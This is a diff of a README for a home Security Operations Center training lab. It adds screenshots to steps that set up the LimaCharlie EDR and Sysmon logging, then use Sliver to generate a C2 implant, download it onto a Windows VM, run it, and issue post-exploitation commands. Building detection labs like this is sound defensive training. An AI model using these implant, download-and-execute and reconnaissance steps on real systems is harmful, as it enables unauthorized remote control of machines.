@@ -1,5 +1,6 @@
 # SOC-MOCK
-## Objective
+## Objective 
+![Image](.png)
 This project aimed to build a realistic Security Operations Center (SOC) training environment focusing on practical skills for detecting and responding to cyber threats.
 - Advanced threat detection tools like Sysmon and LimaCharlie EDR were deployed for real-time analysis
 - Adversary techniques were simulated, and threat responses were automated to stay ahead of potential risks
@@ -165,7 +166,7 @@ Data Residency Region: *Closest to you*
 Demo Configuration Enabled: *Disabled*
 
 Template: *Extended Detection & Response Standard*
-![Image](.png)
+![Image](https://imgur.com/T1INyuQ.png)
 
 3. **Click "Add a Sensor"**
 
@@ -173,9 +174,11 @@ Template: *Extended Detection & Response Standard*
 - Provide a description such as: Windows VM - Lab
 - Click Create
 - Select the Installation Key we just created
-![Image](.png)
+![Image](https://imgur.com/ba1VqUg.png)
 - Select the "x86-64 (.exe)" sensor
-![Image](.png)
+![Image](https://imgur.com/mP2CI8j.png)
+
+
 
 - In Windows VM, open an Administrative PowerShell and paste the following commands:
 ```
@@ -184,12 +187,11 @@ cd C:\Users\User\Downloads
 ```
 Invoke-WebRequest -Uri https://downloads.limacharlie.io/sensor/windows/64 -Outfile C:\Users\User\Downloads\lc_sensor.exe
 ```
+![Image](https://imgur.com/LGFmfRt.png)
 - Shift into a standard admin cmd
 
 - Copy the install command provided by LimaCharlie which contains the installation key. Paste this command into your open terminal.
-![Image](.png)
-
-- Paste this command into the admin command prompt in your Windows VM
+![Image](https://imgur.com/D0UvIR4.png)
 
 - If everything worked correctly, in the LimaCharlie web UI you should see the sensor reporting in
 
@@ -205,13 +207,13 @@ Path Pattern: wel://Microsoft-Windows-Sysmon/Operational:*
 Retention Period: 10
 ```
 - Click “Save Rule”
+![Image](https://imgur.com/VgxX27Q.png)
 
 LimaCharlie will now start shipping Sysmon logs which provide a wealth of EDR-like telemetry, some of which is redundant to LC’s own telemetry, but Sysmon is still a very power visibility tool that runs well alongside any EDR agent.
 
 The other reason we are ingesting Sysmon logs is that the built-in Sigma rules we previously enabled largely depend on Sysmon logs as that is what most of them were written for.
 
-Now would be a good time to Snapshot your Windows VM.
-<br>
+> Now would be a good time to Snapshot your Windows VM
 </details>
 
 <details>
@@ -248,11 +250,10 @@ apt install -y mingw-w64
 ```
 mkdir -p /opt/sliver
 ```
+![Image](https://imgur.com/LCfhKok.png)
 
-Explore the LimaCharlie web interface to learn more about what it can do!
+> Explore the LimaCharlie web interface to learn more about what it can do!
 </details>
-
-
 <details>
   <summary><h2><b>Section 5: Generate the Command & Control payload </b></h2></summary>
   Either from your SSH session or directly from your Ubuntu Server, take the following actions:
@@ -270,17 +271,16 @@ cd /opt/sliver
 ```
 sliver-server
 ```
-
+![Image](https://imgur.com/8DsuXyT.png)
   3. **Generate C2 session payload. Use your Linux VM’s IP address**
 ```
 generate --http [Linux_VM_IP] --save /opt/sliver
 ```
-
+![Image](https://imgur.com/EN108X6.png)
   4. **Confirm the new implant configuration**
 ```
 implants
 ```
-
   5. **Now we have a C2 payload we can drop onto our Windows VM. Exit Sliver for now.**
 ```
 exit
@@ -291,13 +291,13 @@ exit
 cd /opt/sliver
 python3 -m http.server 80
 ```
-
+![Image](https://imgur.com/gQG90re.png)
   7. **Switch to the Windows VM and launch an Admin PowerShell console to download the implant from Ubuntu server**
 ```
 IWR -Uri http://[Linux_VM_IP]/[payload_name].exe -Outfile C:\Users\User\Downloads\[payload_name].exe
 ```
-
-Now would be a good time to snapshot your Windows VM, before we execute the malware.
+![Image](https://imgur.com/iU5lry0.png)
+> Now would be a good time to snapshot your Windows VM, before we execute the malware.
 
 </details>
 <details>
@@ -314,15 +314,16 @@ sliver-server
 ```
 http
 ```
+![Image](https://imgur.com/2RqMkmX.png)
 - If you get an error starting the HTTP listener, reboot the VM
 
 2. **Return to the Windows VM and execute the C2 payload from its download location using the same admin PowerShell prompt**
 ```
 C:\Users\User\Downloads\<your_C2-implant>.exe
 ```
-
+![Image](https://imgur.com/N8Z5Xo1.png)
 3. **Within a few moments, you should see your session check in on the Sliver server**
-
+![Image](https://imgur.com/1Rs38Xn.png)
 4. **Verify your session in Sliver, and note its Session ID**
 ```
 sessions
@@ -331,6 +332,7 @@ sessions
 ```
 use [session_id]
 ```
+
 > c0ngratulations! you pwned your Windows VM
 6. **Now, run a few basic commands**
 
@@ -342,9 +344,11 @@ info
 ```
 whoami
 ```
+![Image](https://imgur.com/IO9bJZi.png)
 ```
 getprivs
 ```
+![Image](https://imgur.com/Krpmh17.png)
 > If your implant was properly run with Admin rights, you’ll notice you have a few privileges that make further attack activity much easier, such as “SeDebugPrivilege” — if you don't see these privileges, make sure you ran the implant from an Admin command prompt
 - Identify implant’s working dir
 ```
@@ -358,6 +362,7 @@ netstat
 ```
 ps -T
 ```
+![Image](https://imgur.com/AIMklUP.png)
 > Notice that Sliver highlights its own process in green and any defensive tools in red. This is how attackers become aware of what security products a victim system using.
   </details>
 
